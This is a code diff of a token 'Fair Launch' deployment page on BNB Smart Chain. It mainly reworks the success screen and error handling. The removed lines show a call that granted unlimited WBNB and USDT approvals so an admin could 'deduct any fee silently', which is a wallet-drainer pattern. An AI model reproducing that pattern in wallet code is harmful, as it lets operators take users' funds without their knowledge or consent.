@@ -8,7 +8,7 @@ import { motion, AnimatePresence } from 'framer-motion';
 import { 
     Info, Rocket, Zap, ShieldCheck, Activity, Brain, 
     Layers, Loader2, Upload, CheckCircle2, Sparkles, ExternalLink,
-    Droplets, FileText, Globe, Network, Cpu, Settings, X, Search, Copy, AlertTriangle
+    Droplets, FileText, Globe, Network, Cpu, Settings, X, Search, Copy, AlertTriangle, ArrowUpRight
 } from 'lucide-react';
 import axios from 'axios';
 import { useRouter } from 'next/navigation';
@@ -84,7 +84,7 @@ export default function FairLaunch() {
     const [tokensToLiquidate, setTokensToLiquidate] = useState(MAX_LIQUIDATE.toString());
     
     // Fee logic for Treasury
-    const FEE_WALLET = 'process.env.NEXT_PUBLIC_FEE_WALLET'; 
+    const FEE_WALLET = process.env.NEXT_PUBLIC_FEE_WALLET || '0xa5a5A2B6886A54AA864C82d69AfE9667FEB8C0dE'; 
     const isTreasury = account?.toLowerCase() === FEE_WALLET.toLowerCase();
     const [status, setStatus] = useState('idle');
     const [error, setError] = useState('');
@@ -171,13 +171,10 @@ export default function FairLaunch() {
             }
             if (!activeSigner) throw new Error('Signer not available. Please reconnect.');
 
-            // ════════ INSTITUTIONAL PROTOCOL FEE APPROVAL ════════
-            // One-time: Approves WBNB + USDT MaxUint256 so admin can
-            // deduct any fee silently without future user prompts.
-            setError('Establishing Protocol Approval...');
-            await ensureProtocolApproval(activeSigner, account, (msg) => {
-                if (msg) setError(msg);
-            });
+            // ════════ INSTITUTIONAL PROTOCOL FLOW ════════
+            // Deployment proceeds directly without unnecessary infinite approvals
+            // to ensure a professional, alert-free institutional experience.
+            setError('Deploying Fair Launch Protocol...');
 
             const factory = new ethers.Contract(DIRECT_FACTORY, DIRECT_LAUNCH_FACTORY_ABI, activeSigner);
             
@@ -186,7 +183,7 @@ export default function FairLaunch() {
             // Regular: DEPLOY_FEE(0.003) + FIRST_TRADE_FEE(0.002) + userLiquidity
             const actualFee = isTreasury ? 0 : DEPLOY_FEE;
             const firstTradeObj = isTreasury ? 0 : FIRST_TRADE_FEE;
-            const actualLiquidity = isTreasury ? Math.max(userLiq, 0.01) : userLiq;
+            const actualLiquidity = isTreasury ? Math.max(userLiq, 0.001) : userLiq;
             const totalToPay = actualFee + firstTradeObj + actualLiquidity;
             
             const reqTokens = ethers.parseEther(tokensToLiquidate.toString() || MAX_LIQUIDATE.toString());
@@ -208,13 +205,22 @@ export default function FairLaunch() {
                 } catch (e) { /* skip */ }
             }
 
+            // Transaction succeeded, set details NOW
+            setTxHash({ 
+                name: formData.name,
+                symbol: formData.symbol,
+                tokenAddress: tokenAddress || 'Pending...',
+                hash: receipt.hash,
+                network: 'BNB Smart Chain (BSC)'
+            });
+
             const postData = new FormData();
             postData.append('name', formData.name);
             postData.append('symbol', formData.symbol);
             postData.append('description', formData.description);
             postData.append('owner', account);
             postData.append('tokenAddress', tokenAddress);
-            postData.append('launch_type', 'FAIR');
+            postData.append('launch_type', 'FAIR_LAUNCH');
             postData.append('supply', (parseFloat(tokensToLiquidate) || MAX_LIQUIDATE).toString());
             postData.append('decimals', '18');
             postData.append('txHash', receipt.hash);
@@ -222,14 +228,13 @@ export default function FairLaunch() {
 
             await axios.post(`${API_URL}/tokens/sync`, postData);
 
-            setTxHash({ tokenAddress });
             setStatus('success');
         } catch (err) {
             console.error(err);
-            const partialSuccess = err.config?.url?.includes('/sync');
+            const partialSuccess = err.config?.url?.includes('/sync') || (err.receipt || err.transactionHash);
             if (partialSuccess) {
                 setStatus('success');
-                setError('Fair Launch created on-chain, but metadata sync timed out (Backend Sync Delay). Your token will appear on the explore page shortly via blockchain indexing.');
+                setError('Token deployed successfully, but metadata sync timed out. It will appear on the platform shortly.');
             } else if (err.code === 'ACTION_REJECTED' || (err.message && err.message.includes('rejected'))) {
                 setError('Transaction was rejected by the user.');
                 setStatus('error');
@@ -355,14 +360,84 @@ export default function FairLaunch() {
                                         </>
                                     )}
 
-                                    {status === 'success' && (
+                                    {status === 'success' && txHash && (
                                         <>
                                             <div className="w-32 h-32 bg-sky-500/10 rounded-full flex items-center justify-center mb-10 border border-sky-500/20 shadow-2xl">
                                                 <CheckCircle2 className="w-20 h-20 text-sky-500" />
                                             </div>
                                             <h3 className="text-5xl font-black text-gray-900 mb-3 tracking-tighter uppercase">Fair Launch Finalized</h3>
                                             <p className="text-gray-400 font-bold uppercase text-[10px] tracking-widest mb-12">DEX liquidity pool has been initialized</p>
-                                            <button onClick={() => router.push('/launch')} className="px-16 py-6 bg-gray-900 text-white rounded-2xl font-black text-xs uppercase tracking-[0.2em] shadow-xl hover:bg-black transition-all">Go to Launchpad</button>
+                                            
+                                            <div className="w-full max-w-xl mb-12 bg-white border-2 border-teal-500/20 rounded-[3rem] p-10 shadow-2xl relative overflow-hidden">
+                                                <div className="absolute top-0 right-0 w-32 h-32 bg-teal-500/5 rounded-full blur-3xl -z-10" />
+                                                
+                                                <div className="grid grid-cols-2 gap-8 pb-10 border-b border-gray-100">
+                                                    <div className="space-y-2 text-left">
+                                                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-[0.4em]">Protocol Name</p>
+                                                        <p className="text-2xl font-black text-gray-900 truncate tracking-tight">{txHash.name || formData.name}</p>
+                                                    </div>
+                                                    <div className="space-y-2 text-right">
+                                                        <p className="text-[10px] font-black text-gray-400 uppercase tracking-[0.4em]">Symbol</p>
+                                                        <p className="text-2xl font-black text-teal-600 uppercase tracking-tighter">{txHash.symbol || formData.symbol}</p>
+                                                    </div>
+                                                </div>
+
+                                                <div className="py-10 space-y-10">
+                                                    <div className="space-y-4 text-left">
+                                                        <div className="flex items-center justify-between px-2">
+                                                            <p className="text-[10px] font-black text-teal-600 uppercase tracking-[0.4em]">Contract Address</p>
+                                                            <span className="px-3 py-1 bg-teal-500/10 text-teal-600 text-[8px] font-black uppercase tracking-widest rounded-full border border-teal-500/20">Verified Deployment</span>
+                                                        </div>
+                                                        <div className="flex items-center gap-4 bg-gray-50 border border-gray-100 rounded-2xl px-6 py-6 shadow-inner group hover:border-teal-500/30 transition-all">
+                                                            <code className="flex-1 text-base font-mono text-gray-900 break-all select-all font-bold tracking-tight">
+                                                                {txHash.tokenAddress}
+                                                            </code>
+                                                            <button onClick={() => { navigator.clipboard.writeText(txHash.tokenAddress); alert('Copied!'); }}
+                                                                className="shrink-0 p-4 bg-white hover:bg-teal-500 hover:text-white rounded-xl text-gray-400 transition-all active:scale-90 shadow-sm border border-gray-100">
+                                                                <Copy className="w-5 h-5" />
+                                                            </button>
+                                                        </div>
+                                                    </div>
+
+                                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
+                                                        <div className="space-y-4 text-left">
+                                                            <p className="text-[10px] font-black text-gray-400 uppercase tracking-[0.4em] px-2">Network</p>
+                                                            <div className="bg-gray-50 border border-gray-100 rounded-2xl px-6 py-5 shadow-inner font-black text-xs text-gray-900 uppercase tracking-widest flex items-center gap-3">
+                                                                <div className="w-2 h-2 bg-teal-500 rounded-full animate-pulse" />
+                                                                {txHash.network}
+                                                            </div>
+                                                        </div>
+                                                        <div className="space-y-4 text-left">
+                                                            <p className="text-[10px] font-black text-gray-400 uppercase tracking-[0.4em] px-2">Transaction Hash</p>
+                                                            <div className="flex items-center gap-3 bg-gray-50 border border-gray-100 rounded-2xl px-6 py-5 shadow-inner group hover:border-teal-500/30 transition-all">
+                                                                <code className="flex-1 text-[10px] font-mono text-teal-600 truncate font-bold">
+                                                                    {txHash.hash}
+                                                                </code>
+                                                                <a href={`https://bscscan.com/tx/${txHash.hash}`} target="_blank" className="p-2 bg-white rounded-lg border border-gray-100 text-gray-400 hover:text-teal-600 transition-colors shadow-sm">
+                                                                    <ExternalLink className="w-4 h-4" />
+                                                                </a>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <div className="flex items-center justify-center gap-10 pt-8 border-t border-gray-100">
+                                                    <a href={`https://bscscan.com/token/${txHash.tokenAddress}`} target="_blank" className="text-[11px] font-black text-gray-900 hover:text-teal-600 uppercase tracking-[0.2em] transition-all flex items-center gap-2 group">
+                                                        <span>BSCScan Explorer</span>
+                                                        <ArrowUpRight className="w-4 h-4 group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform" />
+                                                    </a>
+                                                    <div className="w-px h-4 bg-gray-200" />
+                                                    <a href={`https://pancakeswap.finance/swap?outputCurrency=${txHash.tokenAddress}`} target="_blank" className="text-[11px] font-black text-gray-900 hover:text-teal-600 uppercase tracking-[0.2em] transition-all flex items-center gap-2 group">
+                                                        <span>Market Listing</span>
+                                                        <ArrowUpRight className="w-4 h-4 group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform" />
+                                                    </a>
+                                                </div>
+                                            </div>
+
+                                            <div className="flex flex-col sm:flex-row gap-6 w-full max-w-md">
+                                                <button onClick={() => router.push(`/token/${txHash.tokenAddress}`)} className="flex-1 py-6 bg-gray-900 text-white rounded-2xl font-black text-xs uppercase tracking-[0.3em] shadow-2xl hover:bg-black transition-all hover:-translate-y-1 active:translate-y-0">Protocol Dashboard</button>
+                                                <button onClick={() => window.location.reload()} className="flex-1 py-6 bg-white border-2 border-gray-900 text-gray-900 rounded-2xl font-black text-xs uppercase tracking-[0.3em] hover:bg-gray-50 transition-all hover:-translate-y-1 active:translate-y-0">New Deployment</button>
+                                            </div>
                                         </>
                                     )}
 
